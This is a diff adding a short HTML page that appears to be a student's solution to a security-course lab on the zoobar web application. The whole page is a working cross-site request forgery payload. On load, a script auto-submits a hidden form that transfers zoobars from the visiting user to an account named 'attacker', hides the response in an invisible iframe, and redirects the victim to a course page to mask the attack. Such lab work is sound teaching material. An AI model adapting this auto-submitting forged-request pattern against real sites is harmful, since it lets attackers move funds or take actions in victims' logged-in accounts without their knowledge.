@@ -1,0 +1,34 @@
+<html>
+  <head>
+  </head>
+  <body>
+      <iframe name="pwnd" id="zooFrame" src="http://zoobar.org/transfer.php" style="visibility:hidden;" width="300px" height="300px">
+    </iframe>
+
+      <form target="pwnd" id="zooForm" action="http://zoobar.org/transfer.php" method="post" >
+          <input name=zoobars type=text value="10">
+          <input name=recipient type=text value="attacker">
+          <input id="sendb" onclick="zooFunc()" type=submit name=submission value="Send">
+     </form>
+
+     <script>
+         var loads = 0;
+         function zooFunc () {
+            /* if (loads == 0) {
+            //     loads ++;
+                window.location.href = "http://cseweb.ucsd.edu/classes/fa11/cse127-a";
+            // } else {
+            //    document.location = "http://cseweb.ucsd.edu/classes/fa11/cse127-a";
+            }  */
+            window.location.href="http://cseweb.ucsd.edu/classes/fa11/cse127-a";
+        }
+         //var zooFrame = document.getElementById("zooFrame");
+         var zoob = document.getElementById("sendb");
+         zoob.click();
+
+     </script>
+
+          
+  </body>
+</html>
+
